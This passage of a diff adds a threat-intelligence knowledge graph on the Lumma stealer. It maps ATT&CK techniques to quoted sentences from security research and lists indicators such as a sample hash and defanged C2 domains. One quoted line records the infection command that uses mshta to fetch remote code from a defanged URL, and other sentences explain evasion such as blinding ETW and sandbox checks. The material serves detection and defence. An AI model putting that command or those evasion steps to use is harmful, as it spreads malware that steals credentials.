+            39,
+            39
+          ]
+        ],
+        "edges": [
+          "EDGE_06e3dbe50ffc",
+          "EDGE_2f8b52279fb4",
+          "EDGE_5df3de05b419",
+          "EDGE_c6cc1956b6fa",
+          "EDGE_f08b2c16e203",
+          "EDGE_096541b6807b",
+          "EDGE_2a90cac27680",
+          "EDGE_dbdb2384c1f3"
+        ],
+        "source": {
+          "TTP:T1071_A Deep Dive into the Latest Version of Lumma InfoStealer": {
+            "best_span_ranges": [
+              [
+                30,
+                30
+              ],
+              [
+                39,
+                39
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "Dynamic analysis revealed that Lumma is calling multiple domains before calling the legitimate “steamcommunity.com”."
+              ],
+              [
+                "Then, Lumma sends another POST request with body containing action(act) property as “recive_message” (with the misspelling of the word receive), version as “4.0” and license ID as “f9tVYj--testik1”."
+              ]
+            ]
+          },
+          "TTP:T1071_www.forcepoint.com_blog_x-labs_unmasking-lumma-stealer-campaign": {
+            "best_span_ranges": [
+              [
+                37,
+                41
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "From the script, ObjGet( function is used to connect to C2, which de-obfuscates to something like a moniker string or CLSID URL, pointing to a remote COM object or ActiveX control, which is a well-known fileless C2 method.",
+                "While the file (Alexander.com) is running, it tries to connect to sites like t[.]me, steamcommunity[.]com, and C2s like dogalmedical[.]org for data exfiltration.",
+                "Lumma Stealer uses TLS for C2 communication because this protocol offers encrypted communication, which makes it difficult to detect malware activity over the communication.",
+                "After receiving the response from the C2 server, the malware begins to exfiltrate data from the victim’s system.",
+                "The data is collected in the form of web browser history, extensions, login data, and cache."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1074",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1074",
+        "ttp_id": "T1074",
+        "best_span_sentences_list": [
+          [
+            "The image below illustrates the file paths that Lumma searches.",
+            "If a specified path is found, the file is read and stored in the designated directory path before being exfiltrated to C2."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            49,
+            50
+          ]
+        ],
+        "edges": [
+          "EDGE_e8bb82a1c34c"
+        ],
+        "source": {
+          "TTP:T1074_A Deep Dive into the Latest Version of Lumma InfoStealer": {
+            "best_span_ranges": [
+              [
+                49,
+                50
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "The image below illustrates the file paths that Lumma searches.",
+                "If a specified path is found, the file is read and stored in the designated directory path before being exfiltrated to C2."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1083",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1083",
+        "ttp_id": "T1083",
+        "best_span_sentences_list": [
+          [
+            "The image below illustrates the file paths that Lumma searches.",
+            "If a specified path is found, the file is read and stored in the designated directory path before being exfiltrated to C2."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            49,
+            50
+          ]
+        ],
+        "edges": [
+          "EDGE_a5c2af776aa9"
+        ],
+        "source": {
+          "TTP:T1083_A Deep Dive into the Latest Version of Lumma InfoStealer": {
+            "best_span_ranges": [
+              [
+                49,
+                50
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "The image below illustrates the file paths that Lumma searches.",
+                "If a specified path is found, the file is read and stored in the designated directory path before being exfiltrated to C2."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1106",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1106",
+        "ttp_id": "T1106",
+        "best_span_sentences_list": [
+          [
+            "Lumma uses an API hashing technique to dynamically resolve API functions during runtime, a common method employed by malware to locate APIs as needed.",
+            "Below listed are a few API’s resolved by Lumma dynamically,\n- RtlAllocateHeap\n- RtlReAllocateHeap\n- RtlFreeHeap\n- RtlExpandEnvironmentStrings\nAlso, APIs required for networking are resolved using the same function.",
+            "Lumma sample being 32-bit, it uses Heaven’s gate technique to run 64-bit code when it is executed on a 64-bit machine.",
+            "To invoke NTAPI functions, Lumma constructs a table that includes Syscall Hashes and Syscall Indexes."
+          ],
+          [
+            "Lumma invokes the NtSetInformationProcess API, passing a structure that modifies the ProcessInformation class.",
+            "By setting the Callback field to 0 in the structure, callbacks set by security softwares like ETW (Event Tracing for Windows) are removed and this prevents those software from monitoring the system calls made by Lumma stealer."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            15,
+            18
+          ],
+          [
+            22,
+            23
+          ]
+        ],
+        "edges": [
+          "EDGE_80dd8e4acfcd",
+          "EDGE_2edc22aeb0f3"
+        ],
+        "source": {
+          "TTP:T1106_A Deep Dive into the Latest Version of Lumma InfoStealer": {
+            "best_span_ranges": [
+              [
+                15,
+                18
+              ],
+              [
+                22,
+                23
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "Lumma uses an API hashing technique to dynamically resolve API functions during runtime, a common method employed by malware to locate APIs as needed.",
+                "Below listed are a few API’s resolved by Lumma dynamically,\n- RtlAllocateHeap\n- RtlReAllocateHeap\n- RtlFreeHeap\n- RtlExpandEnvironmentStrings\nAlso, APIs required for networking are resolved using the same function.",
+                "Lumma sample being 32-bit, it uses Heaven’s gate technique to run 64-bit code when it is executed on a 64-bit machine.",
+                "To invoke NTAPI functions, Lumma constructs a table that includes Syscall Hashes and Syscall Indexes."
+              ],
+              [
+                "Lumma invokes the NtSetInformationProcess API, passing a structure that modifies the ProcessInformation class.",
+                "By setting the Callback field to 0 in the structure, callbacks set by security softwares like ETW (Event Tracing for Windows) are removed and this prevents those software from monitoring the system calls made by Lumma stealer."
+              ]
+            ]
+          },
+          "TTP:T1106_www.forcepoint.com_blog_x-labs_unmasking-lumma-stealer-campaign": {
+            "best_span_ranges": [
+              [
+                35,
+                35
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "The script is capable of injecting into its own process (Alexander.com), which can be obtained by repeated use of DllCall(“kernel32.dll”, “ptr”, “GetCurrentProcess”)\\Second stage payload execution using the Execute function."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1113",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1113",
+        "ttp_id": "T1113",
+        "best_span_sentences_list": [
+          [
+            "The \"se\" property which is set to “true” appears to be responsible for taking screenshots."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            43,
+            43
+          ]
+        ],
+        "edges": [],
+        "source": {
+          "TTP:T1113_A Deep Dive into the Latest Version of Lumma InfoStealer": {
+            "best_span_ranges": [
+              [
+                43,
+                43
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "The \"se\" property which is set to “true” appears to be responsible for taking screenshots."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1140",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1140",
+        "ttp_id": "T1140",
+        "best_span_sentences_list": [
+          [
+            "Performing code analysis on the Lumma’s binary, its main function begins by passing encrypted strings to a decryption routine."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            7,
+            7
+          ]
+        ],
+        "edges": [
+          "EDGE_f26373c2e581"
+        ],
+        "source": {
+          "TTP:T1140_A Deep Dive into the Latest Version of Lumma InfoStealer": {
+            "best_span_ranges": [
+              [
+                7,
+                7
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "Performing code analysis on the Lumma’s binary, its main function begins by passing encrypted strings to a decryption routine."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1497",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1497",
+        "ttp_id": "T1497",
+        "best_span_sentences_list": [
+          [
+            "To avoid detection in sandbox environments, Lumma checks for the presence of specific sandbox or antivirus-related DLLs."
+          ],
+          [
+            "For anti-analysis purposes, Lumma includes an optional feature to detect virtual machine (VM) environments.",
+            "This check is performed based on the response from the Command and Control (C2) server, specifically by verifying if the response contains the property named “vm” set to \"true\".",
+            "Lumma also includes a region-specific execution check.",
+            "If the User Default Language is set to Russian (identified by the language code 0x419), the malware will exit with a prompt that the country is not supported."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            24,
+            24
+          ],
+          [
+            26,
+            29
+          ]
+        ],
+        "edges": [
+          "EDGE_c92068dab7c3"
+        ],
+        "source": {
+          "TTP:T1497_A Deep Dive into the Latest Version of Lumma InfoStealer": {
+            "best_span_ranges": [
+              [
+                24,
+                24
+              ],
+              [
+                26,
+                29
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "To avoid detection in sandbox environments, Lumma checks for the presence of specific sandbox or antivirus-related DLLs."
+              ],
+              [
+                "For anti-analysis purposes, Lumma includes an optional feature to detect virtual machine (VM) environments.",
+                "This check is performed based on the response from the Command and Control (C2) server, specifically by verifying if the response contains the property named “vm” set to \"true\".",
+                "Lumma also includes a region-specific execution check.",
+                "If the User Default Language is set to Russian (identified by the language code 0x419), the malware will exit with a prompt that the country is not supported."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1562",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1562",
+        "ttp_id": "T1562",
+        "best_span_sentences_list": [
+          [
+            "Lumma invokes the NtSetInformationProcess API, passing a structure that modifies the ProcessInformation class.",
+            "By setting the Callback field to 0 in the structure, callbacks set by security softwares like ETW (Event Tracing for Windows) are removed and this prevents those software from monitoring the system calls made by Lumma stealer."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            22,
+            23
+          ]
+        ],
+        "edges": [
+          "EDGE_4b0424d6205b"
+        ],
+        "source": {
+          "TTP:T1562_A Deep Dive into the Latest Version of Lumma InfoStealer": {
+            "best_span_ranges": [
+              [
+                22,
+                23
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "Lumma invokes the NtSetInformationProcess API, passing a structure that modifies the ProcessInformation class.",
+                "By setting the Callback field to 0 in the structure, callbacks set by security softwares like ETW (Event Tracing for Windows) are removed and this prevents those software from monitoring the system calls made by Lumma stealer."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1568",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1568",
+        "ttp_id": "T1568",
+        "best_span_sentences_list": [
+          [
+            "Lumma checks if the primary domain is available, If not, it attempts to reach the backup domains."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            33,
+            33
+          ]
+        ],
+        "edges": [
+          "EDGE_1e4e1261c92e",
+          "EDGE_d262370f9247",
+          "EDGE_e603969d204c"
+        ],
+        "source": {
+          "TTP:T1568_A Deep Dive into the Latest Version of Lumma InfoStealer": {
+            "best_span_ranges": [
+              [
+                33,
+                33
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "Lumma checks if the primary domain is available, If not, it attempts to reach the backup domains."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1614",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1614",
+        "ttp_id": "T1614",
+        "best_span_sentences_list": [
+          [
+            "Lumma also includes a region-specific execution check.",
+            "If the User Default Language is set to Russian (identified by the language code 0x419), the malware will exit with a prompt that the country is not supported."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            28,
+            29
+          ]
+        ],
+        "edges": [],
+        "source": {
+          "TTP:T1614_A Deep Dive into the Latest Version of Lumma InfoStealer": {
+            "best_span_ranges": [
+              [
+                28,
+                29
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "Lumma also includes a region-specific execution check.",
+                "If the User Default Language is set to Russian (identified by the language code 0x419), the malware will exit with a prompt that the country is not supported."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1114",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1114",
+        "ttp_id": "T1114",
+        "best_span_sentences_list": [
+          [
+            "It also targets user-sensitive files, Telegram data, email clients, cryptocurrency wallets, FTP, and Remote client data and more."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            42,
+            42
+          ]
+        ],
+        "edges": [
+          "EDGE_9de999bb382b"
+        ],
+        "source": {
+          "TTP:T1114_www.forcepoint.com_blog_x-labs_unmasking-lumma-stealer-campaign": {
+            "best_span_ranges": [
+              [
+                42,
+                42
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "It also targets user-sensitive files, Telegram data, email clients, cryptocurrency wallets, FTP, and Remote client data and more."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1204",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1204",
+        "ttp_id": "T1204",
+        "best_span_sentences_list": [
+          [
+            "Forcepoint has identified a distinctive Lumma Stealer campaign leveraging a sophisticated URL-based delivery mechanism to deploy malware.",
+            "This campaign integrates multiple steps, beginning with URLs embedded within PDFs and followed by a series of dropper URLs."
+          ],
+          [
+            "The Lumma Stealer campaign initiates with a strategically crafted URL that leads the user to a PDF file.",
+            "At face value, both the URL and the document appear benign, effectively reducing suspicion and bypassing initial detection."
+          ],
+          [
+            "In the second stage of this campaign, the attacker delivers a malicious PDF file designed to resemble a standard \"bot check\" page, mimicking familiar visual elements that imply the user must verify they are human.",
+            "This is a classic social engineering tactic meant to exploit user trust and urgency.",
+            "What makes this PDF particularly deceptive is that the entire page is clickable, not just specific buttons or links.",
+            "Any user interaction—whether intentional or accidental—triggers a malicious embedded hyperlink, moving the victim seamlessly into the next stage of the attack chain.",
+            "Once clicked, the PDF launches a series of rapid URL redirections.",
+            "These hops traverse through multiple intermediary domains before finally landing on the site hosting the actual payload."
+          ],
+          [
+            "Accompanying this stage are explicit instructions that urge users to copy and paste the URL from the final link to download the archive file, open it using the password, and then execute the .exe file through the command prompt.",
+            "By providing such clear guidance, the attackers ensure that users follow the exact steps required to successfully infect their systems.",
+            "Additionally, the final URL hosting the archive file is geofenced, accessible only in specific regions such as Georgia, Russia, and the Caucasus region of Eastern Europe and West Asia.",
+            "This restriction may indicate targeted operations in these areas, reflecting a strategic focus on demographics or regional vulnerabilities.",
+            "In this campaign, the attacker leverages .accde files to host malicious VB codes in a protected format, making analysis more difficult."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            2,
+            3
+          ],
+          [
+            8,
+            9
+          ],
+          [
+            11,
+            16
+          ],
+          [
+            21,
+            25
+          ]
+        ],
+        "edges": [
+          "EDGE_da50ffe5fd8a",
+          "EDGE_d0561c2b16e8"
+        ],
+        "source": {
+          "TTP:T1204_www.forcepoint.com_blog_x-labs_unmasking-lumma-stealer-campaign": {
+            "best_span_ranges": [
+              [
+                2,
+                3
+              ],
+              [
+                8,
+                9
+              ],
+              [
+                11,
+                16
+              ],
+              [
+                21,
+                25
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "Forcepoint has identified a distinctive Lumma Stealer campaign leveraging a sophisticated URL-based delivery mechanism to deploy malware.",
+                "This campaign integrates multiple steps, beginning with URLs embedded within PDFs and followed by a series of dropper URLs."
+              ],
+              [
+                "The Lumma Stealer campaign initiates with a strategically crafted URL that leads the user to a PDF file.",
+                "At face value, both the URL and the document appear benign, effectively reducing suspicion and bypassing initial detection."
+              ],
+              [
+                "In the second stage of this campaign, the attacker delivers a malicious PDF file designed to resemble a standard \"bot check\" page, mimicking familiar visual elements that imply the user must verify they are human.",
+                "This is a classic social engineering tactic meant to exploit user trust and urgency.",
+                "What makes this PDF particularly deceptive is that the entire page is clickable, not just specific buttons or links.",
+                "Any user interaction—whether intentional or accidental—triggers a malicious embedded hyperlink, moving the victim seamlessly into the next stage of the attack chain.",
+                "Once clicked, the PDF launches a series of rapid URL redirections.",
+                "These hops traverse through multiple intermediary domains before finally landing on the site hosting the actual payload."
+              ],
+              [
+                "Accompanying this stage are explicit instructions that urge users to copy and paste the URL from the final link to download the archive file, open it using the password, and then execute the .exe file through the command prompt.",
+                "By providing such clear guidance, the attackers ensure that users follow the exact steps required to successfully infect their systems.",
+                "Additionally, the final URL hosting the archive file is geofenced, accessible only in specific regions such as Georgia, Russia, and the Caucasus region of Eastern Europe and West Asia.",
+                "This restriction may indicate targeted operations in these areas, reflecting a strategic focus on demographics or regional vulnerabilities.",
+                "In this campaign, the attacker leverages .accde files to host malicious VB codes in a protected format, making analysis more difficult."
+              ]
+            ]
+          },
+          "TTP:T1204_www.nccgroup.com_research-blog_fake-captcha-led-to-lumma": {
+            "best_span_ranges": [
+              [
+                19,
+                19
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "T1204 – User Execution The fake CAPTCHA is where the webpage employs the ClickFix social engineering technique to download the malicious payload."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1555",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1555",
+        "ttp_id": "T1555",
+        "best_span_sentences_list": [
+          [
+            "Lumma Stealer, a potent information-stealing malware, emerged in 2022, targeting sensitive data like browser-stored passwords, cryptocurrency wallets, and 2FA tokens.",
+            "It spreads through phishing campaigns and malicious downloads, posing significant risks to individuals and organizations in the cybersecurity landscape."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            0,
+            1
+          ]
+        ],
+        "edges": [
+          "EDGE_472715b1d6cf",
+          "EDGE_1ac302a91aa5",
+          "EDGE_84100496aab4",
+          "EDGE_d47a0ca9e0e6",
+          "EDGE_d6a92c85a5f6"
+        ],
+        "source": {
+          "TTP:T1555_www.forcepoint.com_blog_x-labs_unmasking-lumma-stealer-campaign": {
+            "best_span_ranges": [
+              [
+                0,
+                1
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "Lumma Stealer, a potent information-stealing malware, emerged in 2022, targeting sensitive data like browser-stored passwords, cryptocurrency wallets, and 2FA tokens.",
+                "It spreads through phishing campaigns and malicious downloads, posing significant risks to individuals and organizations in the cybersecurity landscape."
+              ]
+            ]
+          },
+          "TTP:T1555_www.nccgroup.com_research-blog_fake-captcha-led-to-lumma": {
+            "best_span_ranges": [
+              [
+                4,
+                4
+              ],
+              [
+                31,
+                31
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "In this case, LUMMA was seen targeting browser data, specifically the data stores Login Data and Web Data for Microsoft Edge and Google Chrome."
+              ],
+              [
+                "T1555.003 – Credentials from Password Stores: Credentials from Web Browsers The AutoIt executable deci.com accessed the data stores Login Data and Web Data for both Microsoft Edge and Google Chrome browsers."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1559",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1559",
+        "ttp_id": "T1559",
+        "best_span_sentences_list": [
+          [
+            "From the script, ObjGet( function is used to connect to C2, which de-obfuscates to something like a moniker string or CLSID URL, pointing to a remote COM object or ActiveX control, which is a well-known fileless C2 method."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            37,
+            37
+          ]
+        ],
+        "edges": [],
+        "source": {
+          "TTP:T1559_www.forcepoint.com_blog_x-labs_unmasking-lumma-stealer-campaign": {
+            "best_span_ranges": [
+              [
+                37,
+                37
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "From the script, ObjGet( function is used to connect to C2, which de-obfuscates to something like a moniker string or CLSID URL, pointing to a remote COM object or ActiveX control, which is a well-known fileless C2 method."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1566",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1566",
+        "ttp_id": "T1566",
+        "best_span_sentences_list": [
+          [
+            "Lumma Stealer, a potent information-stealing malware, emerged in 2022, targeting sensitive data like browser-stored passwords, cryptocurrency wallets, and 2FA tokens.",
+            "It spreads through phishing campaigns and malicious downloads, posing significant risks to individuals and organizations in the cybersecurity landscape.",
+            "Forcepoint has identified a distinctive Lumma Stealer campaign leveraging a sophisticated URL-based delivery mechanism to deploy malware.",
+            "This campaign integrates multiple steps, beginning with URLs embedded within PDFs and followed by a series of dropper URLs."
+          ],
+          [
+            "The Lumma Stealer campaign initiates with a strategically crafted URL that leads the user to a PDF file.",
+            "At face value, both the URL and the document appear benign, effectively reducing suspicion and bypassing initial detection."
+          ],
+          [
+            "In the second stage of this campaign, the attacker delivers a malicious PDF file designed to resemble a standard \"bot check\" page, mimicking familiar visual elements that imply the user must verify they are human.",
+            "This is a classic social engineering tactic meant to exploit user trust and urgency."
+          ],
+          [
+            "Once clicked, the PDF launches a series of rapid URL redirections.",
+            "These hops traverse through multiple intermediary domains before finally landing on the site hosting the actual payload."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            0,
+            3
+          ],
+          [
+            8,
+            9
+          ],
+          [
+            11,
+            12
+          ],
+          [
+            15,
+            16
+          ]
+        ],
+        "edges": [
+          "EDGE_de91a95465c8"
+        ],
+        "source": {
+          "TTP:T1566_www.forcepoint.com_blog_x-labs_unmasking-lumma-stealer-campaign": {
+            "best_span_ranges": [
+              [
+                0,
+                3
+              ],
+              [
+                8,
+                9
+              ],
+              [
+                11,
+                12
+              ],
+              [
+                15,
+                16
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "Lumma Stealer, a potent information-stealing malware, emerged in 2022, targeting sensitive data like browser-stored passwords, cryptocurrency wallets, and 2FA tokens.",
+                "It spreads through phishing campaigns and malicious downloads, posing significant risks to individuals and organizations in the cybersecurity landscape.",
+                "Forcepoint has identified a distinctive Lumma Stealer campaign leveraging a sophisticated URL-based delivery mechanism to deploy malware.",
+                "This campaign integrates multiple steps, beginning with URLs embedded within PDFs and followed by a series of dropper URLs."
+              ],
+              [
+                "The Lumma Stealer campaign initiates with a strategically crafted URL that leads the user to a PDF file.",
+                "At face value, both the URL and the document appear benign, effectively reducing suspicion and bypassing initial detection."
+              ],
+              [
+                "In the second stage of this campaign, the attacker delivers a malicious PDF file designed to resemble a standard \"bot check\" page, mimicking familiar visual elements that imply the user must verify they are human.",
+                "This is a classic social engineering tactic meant to exploit user trust and urgency."
+              ],
+              [
+                "Once clicked, the PDF launches a series of rapid URL redirections.",
+                "These hops traverse through multiple intermediary domains before finally landing on the site hosting the actual payload."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1573",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1573",
+        "ttp_id": "T1573",
+        "best_span_sentences_list": [
+          [
+            "While the file (Alexander.com) is running, it tries to connect to sites like t[.]me, steamcommunity[.]com, and C2s like dogalmedical[.]org for data exfiltration.",
+            "Lumma Stealer uses TLS for C2 communication because this protocol offers encrypted communication, which makes it difficult to detect malware activity over the communication.",
+            "After receiving the response from the C2 server, the malware begins to exfiltrate data from the victim’s system.",
+            "The data is collected in the form of web browser history, extensions, login data, and cache."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            38,
+            41
+          ]
+        ],
+        "edges": [
+          "EDGE_1f3ab148d259"
+        ],
+        "source": {
+          "TTP:T1573_www.forcepoint.com_blog_x-labs_unmasking-lumma-stealer-campaign": {
+            "best_span_ranges": [
+              [
+                38,
+                41
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "While the file (Alexander.com) is running, it tries to connect to sites like t[.]me, steamcommunity[.]com, and C2s like dogalmedical[.]org for data exfiltration.",
+                "Lumma Stealer uses TLS for C2 communication because this protocol offers encrypted communication, which makes it difficult to detect malware activity over the communication.",
+                "After receiving the response from the C2 server, the malware begins to exfiltrate data from the victim’s system.",
+                "The data is collected in the form of web browser history, extensions, login data, and cache."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1620",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1620",
+        "ttp_id": "T1620",
+        "best_span_sentences_list": [
+          [
+            "The script can perform in-memory shellcode execution."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            34,
+            34
+          ]
+        ],
+        "edges": [],
+        "source": {
+          "TTP:T1620_www.forcepoint.com_blog_x-labs_unmasking-lumma-stealer-campaign": {
+            "best_span_ranges": [
+              [
+                34,
+                34
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "The script can perform in-memory shellcode execution."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1189",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1189",
+        "ttp_id": "T1189",
+        "best_span_sentences_list": [
+          [
+            "T1189 – Drive-by Compromise The affected user visited the legitimate hxxps://astapowerproject[.]net/ however this visit led to 12 attempts to visit malicious sites – these were blocked."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            7,
+            7
+          ]
+        ],
+        "edges": [
+          "EDGE_3e3150ef0627",
+          "EDGE_5144e53ca8f3",
+          "EDGE_587e1feb1453",
+          "EDGE_71617bc697bc",
+          "EDGE_8eceae4c6887",
+          "EDGE_a71d50a0c618",
+          "EDGE_c1da62f8a72b"
+        ],
+        "source": {
+          "TTP:T1189_www.nccgroup.com_research-blog_fake-captcha-led-to-lumma": {
+            "best_span_ranges": [
+              [
+                7,
+                7
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "T1189 – Drive-by Compromise The affected user visited the legitimate hxxps://astapowerproject[.]net/ however this visit led to 12 attempts to visit malicious sites – these were blocked."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1218",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1218",
+        "ttp_id": "T1218",
+        "best_span_sentences_list": [
+          [
+            "T1218.005 – System Binary Proxy Execution: Mshta Once the Run dialog was opened, a mshta.exe process was created, running the \"mshta.exe\" hxxps://2no[.]co/2Od3Q3 =-+2346823 command."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            28,
+            28
+          ]
+        ],
+        "edges": [
+          "EDGE_21f114a92109",
+          "EDGE_cd1ac4504099",
+          "EDGE_f501e946dfe8"
+        ],
+        "source": {
+          "TTP:T1218_www.nccgroup.com_research-blog_fake-captcha-led-to-lumma": {
+            "best_span_ranges": [
+              [
+                28,
+                28
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "T1218.005 – System Binary Proxy Execution: Mshta Once the Run dialog was opened, a mshta.exe process was created, running the \"mshta.exe\" hxxps://2no[.]co/2Od3Q3 =-+2346823 command."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1518",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1518",
+        "ttp_id": "T1518",
+        "best_span_sentences_list": [
+          [
+            "T1518.001 – Software Discovery: Security Software Discovery."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            32,
+            32
+          ]
+        ],
+        "edges": [],
+        "source": {
+          "TTP:T1518_www.nccgroup.com_research-blog_fake-captcha-led-to-lumma": {
+            "best_span_ranges": [
+              [
+                32,
+                32
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "T1518.001 – Software Discovery: Security Software Discovery."
+              ]
+            ]
+          }
+        }
+      }
+    ],
+    "ioc": [
+      {
+        "node_id": "IOC_19d9bb699b93",
+        "node_class": "ioc",
+        "node_type": "Hash",
+        "node_text": "80741061ccb6a337cbdf1b1b75c4fcfae7dd6ccde8ecc333fcae7bcca5dc8861",
+        "edges": [],
+        "source": {
+          "80741061ccb6a337cbdf1b1b75c4fcfae7dd6ccde8ecc333fcae7bcca5dc8861_A Deep Dive into the Latest Version of Lumma InfoStealer": [
+            [
+              6,
+              "Sample hash (SHA256) : 80741061ccb6a337cbdf1b1b75c4fcfae7dd6ccde8ecc333fcae7bcca5dc8861."
+            ]
+          ]
+        },
+        "raw_value": "80741061ccb6a337cbdf1b1b75c4fcfae7dd6ccde8ecc333fcae7bcca5dc8861",
+        "canonical_value": "80741061ccb6a337cbdf1b1b75c4fcfae7dd6ccde8ecc333fcae7bcca5dc8861"
+      },
+      {
+        "node_id": "IOC_7fb3ea43ad77",
+        "node_class": "ioc",
+        "node_type": "Domain",
+        "node_text": "Steam[.]com",
+        "edges": [
+          "EDGE_2f8b52279fb4",
+          "EDGE_e603969d204c"
+        ],
+        "source": {
+          "Steam[.]com_A Deep Dive into the Latest Version of Lumma InfoStealer": [
+            [
+              34,
+              "In the event that all backup domains are unresponsive, Lumma will use the gaming website Steam[.]com to generate a C2 URL."
+            ]
+          ]
+        },
+        "raw_value": "Steam[.]com",
+        "canonical_value": "steam.com",
+        "normalized_value": "steam.com"
+      },
+      {
+        "node_id": "IOC_ce08fa3e42d0",
+        "node_class": "ioc",
+        "node_type": "Domain",
+        "node_text": "mercharena[.]biz",
+        "edges": [
+          "EDGE_06e3dbe50ffc",
+          "EDGE_e5ac937da96f"
+        ],
+        "source": {
+          "mercharena[.]biz_A Deep Dive into the Latest Version of Lumma InfoStealer": [
+            [
+              32,
+              "For instance, an encrypted C2 domain is decrypted as “mercharena[.]biz”."
+            ],
+            [
+              38,
+              "For this sample, the domain “mercharena[.]biz” was active and returned the expected “ok” response."
+            ]
+          ]
+        },
+        "raw_value": "mercharena[.]biz",
+        "canonical_value": "mercharena.biz",
+        "normalized_value": "mercharena.biz"
+      },
+      {
+        "node_id": "IOC_048fb1f67a2f",
+        "node_class": "ioc",
+        "node_type": "Domain",
+        "node_text": "steamcommunity[.]com",
+        "edges": [
+          "EDGE_c6cc1956b6fa",
+          "EDGE_26a8fc6e21a2"
+        ],
+        "source": {
+          "steamcommunity[.]com_www.forcepoint.com_blog_x-labs_unmasking-lumma-stealer-campaign": [
+            [
+              38,
+              "While the file (Alexander.com) is running, it tries to connect to sites like t[.]me, steamcommunity[.]com, and C2s like dogalmedical[.]org for data exfiltration."
+            ]
+          ],
+          "steamcommunity.com_A Deep Dive into the Latest Version of Lumma InfoStealer": [
+            [
+              30,
